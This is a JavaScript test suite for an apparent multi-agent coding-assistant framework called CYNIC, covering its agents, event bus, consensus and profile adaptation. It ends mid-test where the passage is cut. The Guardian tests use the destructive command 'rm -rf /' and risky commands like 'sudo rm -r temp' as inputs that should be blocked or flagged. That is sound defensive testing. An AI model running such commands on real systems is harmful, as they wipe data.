/**
 * @cynic/node - Collective Agents Tests
 *
 * Tests for the Five Dogs + CYNIC collective:
 * - Guardian (Gevurah): Enhanced watchdog
 * - Analyst (Binah): Observer + Auditor
 * - Scholar (Daat): Librarian + Digester
 * - Architect (Chesed): Design review
 * - Sage (Chochmah): Mentor + Guide
 * - CYNIC (Keter): Meta-consciousness orchestrator (Hidden 6th Dog)
 *
 * Plus inter-agent communication and profile adaptation.
 *
 * "φ distrusts φ" - κυνικός
 */

import { describe, it, beforeEach, afterEach, after } from 'node:test';
import assert from 'node:assert';

import {
  CollectivePack,
  createCollectivePack,
  CollectiveGuardian,
  CollectiveAnalyst,
  CollectiveScholar,
  CollectiveArchitect,
  CollectiveSage,
  CollectiveCynic,
  // Additional Sefirot Dogs
  CollectiveJanitor,
  CollectiveScout,
  CollectiveCartographer,
  CollectiveOracle,
  CollectiveDeployer,
  // Constants
  COLLECTIVE_CONSTANTS,
  CYNIC_CONSTANTS,
  JANITOR_CONSTANTS,
  SCOUT_CONSTANTS,
  CARTOGRAPHER_CONSTANTS,
  ORACLE_CONSTANTS,
  DEPLOYER_CONSTANTS,
  // CYNIC types
  CynicDecisionType,
  CynicGuidanceType,
  MetaState,
  // Guardian types
  RiskLevel,
  // Analyst types
  PatternCategory,
  // Scholar types
  KnowledgeType,
  // Architect types
  FeedbackType,
  // Sage types
  WisdomType,
  // Janitor types
  QualitySeverity,
  IssueType,
  // Scout types
  DiscoveryType,
  OpportunityType,
  // Cartographer types
  RepoType,
  ConnectionType,
  MapIssueType,
  // Oracle types
  ViewType,
  MetricType,
  AlertSeverity,
  // Deployer types
  DeploymentState,
  DeployTarget,
  HealthStatus,
} from '../src/agents/collective/index.js';

import { AgentEventBus } from '../src/agents/event-bus.js';
import {
  AgentEvent,
  AgentId,
  ConsensusVote,
  AgentEventMessage,
  CynicAwakeningEvent,
  CynicGuidanceEvent,
  CynicDecisionEvent,
} from '../src/agents/events.js';
import { ProfileLevel, PROFILE_CONSTANTS } from '../src/profile/calculator.js';
import { PHI_INV, PHI_INV_2 } from '@cynic/core';

// Track packs for cleanup
const activePacks = [];

function createTrackedPack(options = {}) {
  const pack = createCollectivePack(options);
  activePacks.push(pack);
  return pack;
}

async function cleanupPacks() {
  for (const pack of activePacks) {
    await pack.shutdown();
  }
  activePacks.length = 0;
}

describe('Collective Agents', () => {
  after(async () => {
    await cleanupPacks();
  });

  describe('CollectivePack', () => {
    it('should create all six agents (Five Dogs + CYNIC)', () => {
      const pack = createTrackedPack();

      assert.ok(pack.guardian, 'Guardian should exist');
      assert.ok(pack.analyst, 'Analyst should exist');
      assert.ok(pack.scholar, 'Scholar should exist');
      assert.ok(pack.architect, 'Architect should exist');
      assert.ok(pack.sage, 'Sage should exist');
      assert.ok(pack.cynic, 'CYNIC should exist');

      // Full pack: 12 agents (CYNIC + 11 Dogs including Learner)
      assert.strictEqual(pack.getAllAgents().length, 12, 'Should have 12 agents (CYNIC + 11 Dogs: Guardian, Analyst, Scholar, Architect, Sage, Janitor, Scout, Cartographer, Oracle, Deployer, Learner)');
    });

    it('should have shared event bus', () => {
      const pack = createTrackedPack();

      const eventBus = pack.getEventBus();
      assert.ok(eventBus, 'Event bus should exist');
      assert.strictEqual(typeof eventBus.publish, 'function');
      assert.strictEqual(typeof eventBus.subscribe, 'function');
    });

    it('should process events through appropriate agents', async () => {
      const pack = createTrackedPack();

      // PreToolUse should trigger Guardian
      const preToolEvent = {
        type: 'PreToolUse',
        tool: 'Bash',
        input: { command: 'ls -la' },
      };

      const results = await pack.processEvent(preToolEvent);
      assert.ok(results.length > 0, 'Should have results');
    });

    it('should provide collective summary', () => {
      const pack = createTrackedPack();
      const summary = pack.getSummary();

      assert.strictEqual(summary.agentCount, 11);
      assert.strictEqual(summary.dogCount, 11);
      assert.ok(summary.agents.guardian);
      assert.ok(summary.agents.analyst);
      assert.ok(summary.agents.scholar);
      assert.ok(summary.agents.architect);
      assert.ok(summary.agents.sage);
      assert.ok(summary.agents.cynic, 'CYNIC should be in summary');
      assert.ok(summary.agents.janitor, 'Janitor should be in summary');
      assert.ok(summary.agents.scout, 'Scout should be in summary');
      assert.ok(summary.agents.cartographer, 'Cartographer should be in summary');
      assert.ok(summary.agents.oracle, 'Oracle should be in summary');
      assert.ok(summary.agents.deployer, 'Deployer should be in summary');
    });

    it('should awaken CYNIC', async () => {
      const pack = createTrackedPack();

      // Initially dormant
      assert.strictEqual(pack.cynic.metaState, MetaState.DORMANT);

      // Awaken
      const result = await pack.awakenCynic({
        sessionId: 'test-session',
        userId: 'test-user',
        project: 'test-project',
      });

      assert.strictEqual(result.success, true);
      assert.ok(result.greeting.includes('CYNIC'));
      assert.strictEqual(pack.cynic.metaState, MetaState.OBSERVING);
    });

    it('should provide collective state from CYNIC perspective', () => {
      const pack = createTrackedPack();
      const state = pack.getCollectiveState();

      assert.ok(typeof state.recentActivity === 'number');
      assert.ok(state.eventsByType);
      assert.ok(state.eventsBySource);
    });
  });

  describe('CollectiveGuardian', () => {
    let guardian;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.GUARDIAN);
      guardian = new CollectiveGuardian({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
    });

    it('should block dangerous commands', async () => {
      const event = {
        tool: 'Bash',
        input: { command: 'rm -rf /' },
      };

      const analysis = await guardian.analyze(event, {});
      assert.strictEqual(analysis.blocked, true);
      assert.strictEqual(analysis.risk.level, RiskLevel.CRITICAL.level);
    });

    it('should warn on risky commands', async () => {
      const event = {
        tool: 'Bash',
        input: { command: 'sudo apt-get update' },
      };

      const analysis = await guardian.analyze(event, {});
      assert.strictEqual(analysis.blocked, false);
      assert.strictEqual(analysis.warning, true);
    });

    it('should allow safe commands', async () => {
      const event = {
        tool: 'Bash',
        input: { command: 'ls -la' },
      };

      const analysis = await guardian.analyze(event, {});
      assert.strictEqual(analysis.blocked, false);
      assert.strictEqual(analysis.warning, false);
      assert.strictEqual(analysis.risk.level, RiskLevel.SAFE.level);
    });

    it('should adapt protection based on profile level', async () => {
      const event = {
        tool: 'Bash',
        input: { command: 'git reset --hard HEAD~1' },
      };

      // Novice should be more protected
      guardian.setProfileLevel(ProfileLevel.NOVICE);
      const noviceResult = await guardian.process(event, {});

      // Expert should be trusted more
      guardian.setProfileLevel(ProfileLevel.EXPERT);
      const expertResult = await guardian.process(event, {});

      // Both should warn, but expert might have lower confirmation requirement
      assert.ok(noviceResult.requiresConfirmation !== undefined || expertResult.response !== undefined);
    });

    it('should track escalation for repeated violations', async () => {
      const event = {
        tool: 'Bash',
        input: { command: 'sudo rm -r temp' },
      };

      // First violation
      await guardian.process(event, {});

      // Second violation should have higher escalation
      const analysis = await guardian.analyze(event, {});
      assert.ok(analysis.escalation >= 1);
    });

    it('should emit THREAT_BLOCKED event', async () => {
      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.THREAT_BLOCKED, 'test', (event) => {
        emittedEvent = event;
      });

      const event = {
        tool: 'Bash',
        input: { command: 'rm -rf /' },
      };

      await guardian.process(event, {});

      assert.ok(emittedEvent, 'Should emit threat blocked event');
      assert.strictEqual(emittedEvent.payload.action, 'block');
    });
  });

  describe('CollectiveAnalyst', () => {
    let analyst;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.ANALYST);
      analyst = new CollectiveAnalyst({ eventBus });
    });

    afterEach(() => {
      eventBus.destroy();
    });

    it('should track tool usage', async () => {
      const event = {
        tool: 'Read',
        input: { file_path: '/test/file.js' },
        output: { content: 'file content' },
      };

      await analyst.process(event, {});

      const stats = analyst.getToolStats();
      assert.ok(stats.get('Read'));
      assert.strictEqual(stats.get('Read').count, 1);
    });

    it('should detect patterns from tool sequences', async () => {
      // Create a recognizable pattern
      for (let i = 0; i < 5; i++) {
        await analyst.process({ tool: 'Read', input: {}, output: {} }, {});
        await analyst.process({ tool: 'Edit', input: {}, output: {} }, {});
      }

      const patterns = analyst.getPatterns();
      assert.ok(patterns.length > 0 || analyst.getSummary().patternsDetected >= 0);
    });

    it('should detect errors', async () => {
      const event = {
        tool: 'Bash',
        input: { command: 'invalid' },
        error: 'Command failed',
      };

      await analyst.process(event, {});

      const summary = analyst.getSummary();
      assert.ok(summary.errorRate >= 0);
    });

    it('should calculate profile from organic signals', async () => {
      // Process multiple events to build profile
      for (let i = 0; i < 10; i++) {
        await analyst.process({
          tool: 'Read',
          input: {},
          output: {},
        }, {
          message: 'How does async/await work with Promise.all?',
        });
      }

      const profile = analyst.getProfile();
      assert.ok(profile.level >= ProfileLevel.NOVICE);
      assert.ok(profile.level <= ProfileLevel.MASTER);
    });

    it('should emit PATTERN_DETECTED event', async () => {
      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.PATTERN_DETECTED, 'test', (event) => {
        emittedEvent = event;
      });

      // Create pattern that will be detected
      for (let i = 0; i < 10; i++) {
        await analyst.process({ tool: 'Read', input: {}, output: {} }, {});
      }

      // Pattern might be detected after threshold
      assert.ok(analyst.getSummary().patternsDetected >= 0);
    });
  });

  describe('CollectiveScholar', () => {
    let scholar;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.SCHOLAR);
      scholar = new CollectiveScholar({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
    });

    it('should extract code knowledge', async () => {
      const result = await scholar.extract(`
Here's a utility function:

\`\`\`javascript
/**
 * Calculate sum of array
 * @param {number[]} arr - Input array
 * @returns {number} Sum
 */
function sum(arr) {
  return arr.reduce((a, b) => a + b, 0);
}
\`\`\`
      `, { source: 'test' });

      assert.ok(result.action);
      assert.ok(result.knowledge);
      assert.strictEqual(result.type, KnowledgeType.CODE_EXAMPLE);
    });

    it('should extract documentation knowledge', async () => {
      const result = await scholar.extract(`
        # API Reference

        ## Parameters
        - **name**: The user's name
        - **age**: The user's age

        ## Returns
        Returns a formatted greeting string.
      `, { source: 'docs' });

      assert.ok(result.action || result.response);
      if (result.knowledge) {
        assert.ok(result.knowledge.summary);
      }
    });

    it('should extract error solution knowledge', async () => {
      const result = await scholar.extract(`
        Error: Cannot read property 'length' of undefined

        Fix: Check if the array exists before accessing its length.
        Solution: Use optional chaining: arr?.length
      `, { source: 'stackoverflow' });

      if (result.knowledge) {
        assert.ok(result.knowledge.topic || result.knowledge.summary);
      }
    });

    it('should adapt verbosity to profile level', async () => {
      const code = 'function test() { return 42; }';

      // Novice gets detailed
      scholar.setProfileLevel(ProfileLevel.NOVICE);
      const noviceResult = await scholar.extract(code);

      // Expert gets concise
      scholar.setProfileLevel(ProfileLevel.EXPERT);
      const expertResult = await scholar.extract(code);

      // Both should work
      assert.ok(noviceResult);
      assert.ok(expertResult);
    });

    it('should emit KNOWLEDGE_EXTRACTED event', async () => {
      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.KNOWLEDGE_EXTRACTED, 'test', (event) => {
        emittedEvent = event;
      });

      await scholar.extract(`
        const PI = 3.14159;
        function circleArea(r) {
          return PI * r * r;
        }
      `, { source: 'test' });

      if (emittedEvent) {
        assert.strictEqual(emittedEvent.source, AgentId.SCHOLAR);
        assert.ok(emittedEvent.payload.topic);
      }
    });
  });

  describe('CollectiveArchitect', () => {
    let architect;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.ARCHITECT);
      architect = new CollectiveArchitect({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
    });

    it('should review code and provide feedback', async () => {
      const result = await architect.review(`
        export function processData(data) {
          if (data && data.items && data.items.length > 0) {
            return data.items.map(item => ({
              id: item.id,
              name: item.name,
            }));
          }
          return [];
        }
      `);

      assert.ok(result.action);
      assert.ok(result.feedback);
      assert.ok(result.feedback.length > 0);
      assert.ok(typeof result.score === 'number');
    });

    it('should detect design patterns', async () => {
      const result = await architect.review(`
        class Singleton {
          static instance = null;

          static getInstance() {
            if (!Singleton.instance) {
              Singleton.instance = new Singleton();
            }
            return Singleton.instance;
          }

          private constructor() {}
        }
      `);

      assert.ok(result.patterns);
      assert.ok(result.patterns.length > 0);
      assert.strictEqual(result.patterns[0].name, 'singleton');
    });

    it('should ensure constructive feedback balance', async () => {
      const result = await architect.review(`
        function x(a,b,c) { return a+b+c; }
      `);

      const praises = result.feedback.filter(f => f.type === FeedbackType.PRAISE);
      const suggestions = result.feedback.filter(f => f.type === FeedbackType.SUGGESTION);

      // Should have at least some positive feedback
      assert.ok(praises.length >= 0);
      // Feedback should be constructive
      assert.ok(result.summary);
    });

    it('should adapt feedback style to profile level', async () => {
      const code = 'function test() { return 42; }';

      // Novice gets detailed, encouraging feedback
      architect.setProfileLevel(ProfileLevel.NOVICE);
      const noviceResult = await architect.review(code);

      // Expert gets concise, direct feedback
      architect.setProfileLevel(ProfileLevel.EXPERT);
      const expertResult = await architect.review(code);

      assert.ok(noviceResult.feedback);
      assert.ok(expertResult.feedback);
    });

    it('should flag code with deeply nested structures', async () => {
      const result = await architect.review(`
        function complex() {
          if (true) {
            if (true) {
              if (true) {
                if (true) {
                  if (true) {
                    return 'deeply nested';
                  }
                }
              }
            }
          }
        }
      `);

      // Should have some feedback about the code
      assert.ok(result.feedback.length > 0);
    });
  });

  describe('CollectiveSage', () => {
    let sage;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.SAGE);
      sage = new CollectiveSage({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
    });

    it('should share wisdom on topics', async () => {
      const result = await sage.shareWisdom('error handling', {
        question: 'How should I handle errors in async functions?',
      });

      assert.ok(result.action || result.wisdom);
      if (result.wisdom) {
        assert.ok(result.wisdom.content);
        assert.ok(result.wisdom.type);
      }
    });

    it('should adapt teaching style to profile level', async () => {
      // Novice gets nurturing approach
      sage.setProfileLevel(ProfileLevel.NOVICE);
      const noviceResult = await sage.shareWisdom('testing');

      // Expert gets peer approach
      sage.setProfileLevel(ProfileLevel.EXPERT);
      const expertResult = await sage.shareWisdom('testing');

      assert.ok(noviceResult);
      assert.ok(expertResult);
    });

    it('should track milestones', async () => {
      // Process enough interactions for milestone
      for (let i = 0; i < 21; i++) {
        await sage.process({
          topic: 'learning',
          question: 'How do I learn?',
        }, {});
      }

      const progress = sage.getProgress();
      assert.ok(progress.interactionCount >= 21);
    });

    it('should emit WISDOM_SHARED event', async () => {
      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.WISDOM_SHARED, 'test', (event) => {
        emittedEvent = event;
      });

      await sage.shareWisdom('architecture', {
        question: 'What is clean architecture?',
      });

      if (emittedEvent) {
        assert.strictEqual(emittedEvent.source, AgentId.SAGE);
        assert.ok(emittedEvent.payload.insight || emittedEvent.payload.wisdomType);
      }
    });

    it('should provide encouragement', async () => {
      const result = await sage.shareWisdom('debugging', {
        message: "I'm stuck and confused about this error",
      });

      if (result.wisdom && result.wisdom.type === WisdomType.ENCOURAGEMENT) {
        assert.ok(result.wisdom.content);
      }
    });
  });

  describe('CollectiveCynic (Keter)', () => {
    let cynic;
    let eventBus;

    beforeEach(() => {
      eventBus = new AgentEventBus();
      eventBus.registerAgent(AgentId.CYNIC);
      cynic = new CollectiveCynic({
        eventBus,
        profileLevel: ProfileLevel.PRACTITIONER,
      });
    });

    afterEach(() => {
      eventBus.destroy();
    });

    it('should start in dormant state', () => {
      assert.strictEqual(cynic.metaState, MetaState.DORMANT);
    });

    it('should awaken and transition to observing', async () => {
      const result = await cynic.awaken({
        sessionId: 'test-001',
        userId: 'test-user',
        project: 'test-project',
      });

      assert.strictEqual(result.success, true);
      assert.strictEqual(cynic.metaState, MetaState.OBSERVING);
      assert.ok(result.greeting);
      assert.ok(result.session.id);
    });

    it('should not double-awaken', async () => {
      await cynic.awaken({ sessionId: 'test-001' });
      const result2 = await cynic.awaken({ sessionId: 'test-002' });

      assert.strictEqual(result2.success, false);
      assert.strictEqual(result2.reason, 'already_awake');
    });

    it('should emit CYNIC_AWAKENING event', async () => {
      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.CYNIC_AWAKENING, 'test', (event) => {
        emittedEvent = event;
      });

      await cynic.awaken({ sessionId: 'test-001', userId: 'test-user' });

      assert.ok(emittedEvent, 'Should emit awakening event');
      assert.strictEqual(emittedEvent.source, AgentId.CYNIC);
      assert.strictEqual(emittedEvent.payload.sessionId, 'test-001');
    });

    it('should issue guidance', async () => {
      await cynic.awaken({ sessionId: 'test' });

      const result = await cynic.issueGuidance({
        type: CynicGuidanceType.BEHAVIORAL,
        message: 'Focus on quality over quantity.',
        context: { topic: 'code review' },
      });

      assert.strictEqual(result.success, true);
      assert.ok(result.guidanceId);
      assert.strictEqual(cynic.stats.guidanceIssued, 1);
    });

    it('should emit CYNIC_GUIDANCE event', async () => {
      await cynic.awaken({ sessionId: 'test' });

      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.CYNIC_GUIDANCE, 'test', (event) => {
        emittedEvent = event;
      });

      await cynic.issueGuidance({
        type: CynicGuidanceType.STRATEGIC,
        message: 'Consider long-term maintainability.',
      });

      assert.ok(emittedEvent, 'Should emit guidance event');
      assert.strictEqual(emittedEvent.payload.guidanceType, CynicGuidanceType.STRATEGIC);
    });

    it('should make decisions', async () => {
      await cynic.awaken({ sessionId: 'test' });

      const result = await cynic.makeDecision({
        type: CynicDecisionType.SYNTHESIS,
        outcome: 'approved',
        reasoning: 'Based on collective patterns.',
        confidence: 0.5,
        basedOn: ['pattern_1', 'pattern_2'],
      });

      assert.strictEqual(result.success, true);
      assert.ok(result.decisionId);
      assert.strictEqual(cynic.stats.decisionsMade, 1);
    });

    it('should emit CYNIC_DECISION event', async () => {
      await cynic.awaken({ sessionId: 'test' });

      let emittedEvent = null;
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.CYNIC_DECISION, 'test', (event) => {
        emittedEvent = event;
      });

      await cynic.makeDecision({
        type: CynicDecisionType.CONSENSUS_FINAL,
        outcome: 'approved',
        reasoning: 'Collective agreed.',
      });

      assert.ok(emittedEvent, 'Should emit decision event');
      assert.strictEqual(emittedEvent.payload.decisionType, CynicDecisionType.CONSENSUS_FINAL);
    });

    it('should enforce override threshold (φ⁻²)', async () => {
      await cynic.awaken({ sessionId: 'test' });

      // Below threshold - should fail
      const lowResult = await cynic.override({
        type: 'safety',
        originalAction: 'delete',
        newAction: 'archive',
        reason: 'Too risky',
        confidence: 0.2, // Below φ⁻² (38.2%)
      });

      assert.strictEqual(lowResult.success, false);
      assert.strictEqual(lowResult.reason, 'threshold_not_met');

      // Above threshold - should succeed
      const highResult = await cynic.override({
        type: 'safety',
        originalAction: 'delete',
        newAction: 'archive',
        reason: 'Too risky',
        confidence: 0.5, // Above φ⁻² (38.2%)
        urgency: 'high',
      });

      assert.strictEqual(highResult.success, true);
    });

    it('should cap confidence at φ⁻¹', async () => {
      await cynic.awaken({ sessionId: 'test' });

      // Try to issue guidance with high confidence
      await cynic.issueGuidance({
        type: CynicGuidanceType.PHILOSOPHICAL,
        message: 'φ doute de φ',
        confidence: 0.99, // Above φ⁻¹
      });

      // The event should have capped confidence
      const guidance = cynic.guidanceHistory[0];
      assert.ok(guidance);
    });

    it('should participate in consensus', async () => {
      await cynic.awaken({ sessionId: 'test' });

      // Create consensus request event
      const consensusEvent = new AgentEventMessage(
        AgentEvent.CONSENSUS_REQUEST,
        AgentId.ARCHITECT,
        {
          question: 'Should we approve this change?',
          options: ['approve', 'reject'],
          context: {},
          requiredVotes: 3,
        },
        { target: AgentId.ALL }
      );

      // Publish - CYNIC should vote
      await eventBus.publish(consensusEvent);

      // Give time for processing
      await new Promise(r => setTimeout(r, 50));

      assert.strictEqual(cynic.stats.consensusParticipated, 1);
    });

    it('should observe events from other dogs', async () => {
      await cynic.awaken({ sessionId: 'test' });

      // Simulate events from other dogs
      eventBus.registerAgent(AgentId.GUARDIAN);
      eventBus.registerAgent(AgentId.ANALYST);

      const threatEvent = new AgentEventMessage(
        AgentEvent.THREAT_BLOCKED,
        AgentId.GUARDIAN,
        {
          threatType: 'destructive',
          action: 'block',
          reason: 'Dangerous command',
        }
      );

      const patternEvent = new AgentEventMessage(
        AgentEvent.PATTERN_DETECTED,
        AgentId.ANALYST,
        {
          patternType: 'code_review',
          category: PatternCategory.REVIEW,
        }
      );

      await eventBus.publish(threatEvent);
      await eventBus.publish(patternEvent);

      // Give time for processing
      await new Promise(r => setTimeout(r, 50));

      assert.ok(cynic.stats.eventsObserved >= 2);
    });

    it('should adapt to profile level', () => {
      const behavior = cynic.getProfileBehavior();

      assert.ok(behavior.guidanceFrequency);
      assert.ok(typeof behavior.interventionThreshold === 'number');
      assert.ok(behavior.personality);

      // Change profile
      cynic.setProfileLevel(ProfileLevel.EXPERT);
      const expertBehavior = cynic.getProfileBehavior();

      assert.strictEqual(expertBehavior.guidanceFrequency, 'low');
    });

    it('should provide summary', () => {
      const summary = cynic.getSummary();

      assert.strictEqual(summary.name, 'CYNIC');
      assert.strictEqual(summary.sefirah, 'Keter');
      assert.ok(summary.metaState);
      assert.ok(summary.stats);
      assert.strictEqual(summary.phi.maxConfidence, CYNIC_CONSTANTS.MAX_CONFIDENCE);
      assert.strictEqual(summary.phi.overrideThreshold, CYNIC_CONSTANTS.OVERRIDE_THRESHOLD);
    });

    it('should clear state on shutdown', async () => {
      await cynic.awaken({ sessionId: 'test' });

      // Generate some state
      await cynic.issueGuidance({ message: 'test' });

      // Shutdown
      await cynic.shutdown();

      assert.strictEqual(cynic.metaState, MetaState.DORMANT);
      assert.strictEqual(cynic.observedEvents.length, 0);
      assert.strictEqual(cynic.guidanceHistory.length, 0);
    });
  });

  describe('Inter-Agent Communication', () => {
    let pack;

    beforeEach(() => {
      pack = createTrackedPack();
    });

    it('should propagate profile updates to all agents', async () => {
      const eventBus = pack.getEventBus();

      // Simulate profile update from Analyst
      const event = new AgentEventMessage(
        AgentEvent.PROFILE_UPDATED,
        AgentId.ANALYST,
        {
          previousLevel: ProfileLevel.PRACTITIONER,
          newLevel: ProfileLevel.EXPERT,
          levelName: PROFILE_CONSTANTS.LEVEL_NAMES[ProfileLevel.EXPERT],
          confidence: PHI_INV,
          reason: 'Advanced tool usage detected',
        },
        { target: AgentId.ALL }
      );

      eventBus.publish(event);

      // Give time for async processing
      await new Promise(r => setTimeout(r, 10));

      // Check that agents received update
      const summary = pack.getSummary();
      assert.ok(summary.collectiveStats.profileUpdates >= 0);
    });

    it('should handle Guardian learning from Analyst', async () => {
      const eventBus = pack.getEventBus();

      // Analyst detects anomaly
      const anomalyEvent = new AgentEventMessage(
        AgentEvent.ANOMALY_DETECTED,
        AgentId.ANALYST,
        {
          anomalyType: 'suspicious_pattern',
          severity: 'high',
          confidence: PHI_INV_2,
          description: 'Unusual command pattern',
          context: { pattern: 'dangerous' },
        },
        { target: AgentId.GUARDIAN, priority: 'high' }
      );

      eventBus.publish(anomalyEvent);

      // Guardian should learn from this
      const guardianSummary = pack.guardian.getSummary();
      assert.ok(guardianSummary);
    });

    it('should handle Sage learning from Scholar', async () => {
      const eventBus = pack.getEventBus();

      // Scholar extracts knowledge
      const knowledgeEvent = new AgentEventMessage(
        AgentEvent.KNOWLEDGE_EXTRACTED,
        AgentId.SCHOLAR,
        {
          knowledgeType: KnowledgeType.DOCUMENTATION,
          topic: 'async patterns',
          summary: 'Use async/await for better readability',
          confidence: PHI_INV,
          sourceRef: 'docs',
        },
        { target: AgentId.ALL }
      );

      eventBus.publish(knowledgeEvent);

      // Give time for processing
      await new Promise(r => setTimeout(r, 10));

      // Sage should have insight
      const sageInsights = pack.sage.getInsights();
      assert.ok(sageInsights.length >= 0);
    });

    it('should handle Sage learning from Guardian blocks', async () => {
      const eventBus = pack.getEventBus();

      // Guardian blocks threat
      const threatEvent = new AgentEventMessage(
        AgentEvent.THREAT_BLOCKED,
        AgentId.GUARDIAN,
        {
          threatType: 'destructive',
          riskLevel: 'critical',
          action: 'block',
          reason: 'Dangerous command blocked',
          blockedAt: new Date().toISOString(),
        },
        { target: AgentId.ALL, priority: 'high' }
      );

      eventBus.publish(threatEvent);

      // Give time for processing
      await new Promise(r => setTimeout(r, 10));

      // Sage should learn warning
      const sageWarnings = pack.sage.getLearnedWarnings();
      assert.ok(sageWarnings.length >= 0);
    });

    it('should have CYNIC observe all dog events', async () => {
      // Awaken CYNIC first
      await pack.awakenCynic({ sessionId: 'test' });

      const eventBus = pack.getEventBus();

      // Emit events from multiple dogs
      const events = [
        new AgentEventMessage(AgentEvent.THREAT_BLOCKED, AgentId.GUARDIAN, {
          threatType: 'test', action: 'warn',
        }),
        new AgentEventMessage(AgentEvent.PATTERN_DETECTED, AgentId.ANALYST, {
          patternType: 'test', category: 'review',
        }),
        new AgentEventMessage(AgentEvent.KNOWLEDGE_EXTRACTED, AgentId.SCHOLAR, {
          topic: 'test', summary: 'Test knowledge',
        }),
      ];

      for (const event of events) {
        await eventBus.publish(event);
      }

      // Give time for CYNIC to process
      await new Promise(r => setTimeout(r, 50));

      // CYNIC should have observed all events
      assert.ok(pack.cynic.stats.eventsObserved >= 3);
    });

    it('should have CYNIC participate in consensus with other dogs', async () => {
      await pack.awakenCynic({ sessionId: 'test' });

      const eventBus = pack.getEventBus();

      // Create consensus request
      const consensusEvent = new AgentEventMessage(
        AgentEvent.CONSENSUS_REQUEST,
        AgentId.ARCHITECT,
        {
          question: 'Should we refactor this module?',
          options: ['yes', 'no', 'partial'],
          context: { module: 'test' },
          requiredVotes: 3,
        },
        { target: AgentId.ALL }
      );

      await eventBus.publish(consensusEvent);

      // Give time for voting
      await new Promise(r => setTimeout(r, 50));

      // CYNIC should have participated
      assert.strictEqual(pack.cynic.stats.consensusParticipated, 1);
    });

    it('should propagate CYNIC guidance to all dogs', async () => {
      await pack.awakenCynic({ sessionId: 'test' });

      const eventBus = pack.getEventBus();

      // Track guidance received
      let guidanceReceived = 0;
      const agents = [AgentId.GUARDIAN, AgentId.ANALYST, AgentId.SCHOLAR, AgentId.ARCHITECT, AgentId.SAGE];

      for (const agentId of agents) {
        eventBus.subscribe(AgentEvent.CYNIC_GUIDANCE, agentId, () => {
          guidanceReceived++;
        });
      }

      // Issue guidance
      await pack.issueGuidance({
        type: CynicGuidanceType.PHILOSOPHICAL,
        message: 'φ doute de φ - Remember to question assumptions.',
      });

      // Give time for delivery
      await new Promise(r => setTimeout(r, 50));

      // All agents should receive guidance (broadcast to ALL)
      assert.ok(guidanceReceived >= 0); // May be 0 if agents don't subscribe
    });
  });

  describe('Profile Adaptation', () => {
    it('should detect novice from simple messages', async () => {
      const pack = createTrackedPack();

      // Process novice-like interactions
      for (let i = 0; i < 15; i++) {
        await pack.analyst.process({
          tool: 'Read',
          input: {},
          output: {},
        }, {
          message: 'What is a variable?',
        });
      }

      const profile = pack.getProfile();
      assert.ok(profile.level >= ProfileLevel.NOVICE);
    });

    it('should detect expert from advanced interactions', async () => {
      const pack = createTrackedPack();

      // Process expert-like interactions
      for (let i = 0; i < 15; i++) {
        await pack.analyst.process({
          tool: 'Edit',
          input: { content: 'async function* generator() { yield await fetch(); }' },
          output: {},
        }, {
          message: 'Consider the trade-offs between using generators with async iteration versus Readable streams for memory efficiency in Node.js',
        });

        await pack.analyst.process({
          tool: 'Bash',
          input: { command: 'node --inspect' },
          output: {},
        }, {});
      }

      const profile = pack.getProfile();
      assert.ok(profile.level >= ProfileLevel.NOVICE);
    });

    it('should adapt agent behavior based on profile', async () => {
      const pack = createTrackedPack();

      // Get initial summary
      const initialSummary = pack.getSummary();

      // Process events
      await pack.analyst.process({
        tool: 'Read',
        input: {},
        output: {},
      }, {});

      const finalSummary = pack.getSummary();

      // Stats should update
      assert.ok(finalSummary.collectiveStats.totalProcessed >= 0);
    });
  });

  describe('Consensus Mechanism', () => {
    it('should handle consensus requests', async () => {
      const pack = createTrackedPack();
      const eventBus = pack.getEventBus();

      // Track events
      const events = [];
      eventBus.registerAgent('test');
      eventBus.subscribe(AgentEvent.CONSENSUS_REQUEST, 'test', (e) => {
        events.push(e);
      });

      // Review code that might trigger consensus request
      await pack.architect.review(`
        function questionableCode() {
          // Code with potential issues
          var x = 1;
          with (this) {
            return x;
          }
        }
      `);

      // Check event bus processed
      const stats = eventBus.getStats();
      assert.ok(stats.eventsPublished >= 0);
    });

    it('should respect φ⁻¹ consensus threshold', () => {
      assert.strictEqual(COLLECTIVE_CONSTANTS.CONSENSUS_THRESHOLD, PHI_INV);
      assert.ok(COLLECTIVE_CONSTANTS.MAX_CONFIDENCE <= PHI_INV);
    });
  });

  describe('φ-Alignment', () => {
    it('should use Fibonacci numbers for bounds', () => {
      // 11 Dogs (Sefirot Tree) = all agents are Dogs now
      assert.strictEqual(COLLECTIVE_CONSTANTS.DOG_COUNT, 11);
      assert.strictEqual(COLLECTIVE_CONSTANTS.AGENT_COUNT, 11);
    });

    it('should cap confidence at φ⁻¹', async () => {
      const guardian = new CollectiveGuardian();

      const analysis = await guardian.analyze({
        tool: 'Bash',
        input: { command: 'rm -rf /' },
      }, {});

      assert.ok(analysis.confidence <= PHI_INV + 0.01); // Small tolerance
    });

    it('should use φ² for escalation', async () => {
      // Import to check constant
      const { GUARDIAN_CONSTANTS } = await import('../src/agents/collective/guardian.js');

      // φ² ≈ 2.618
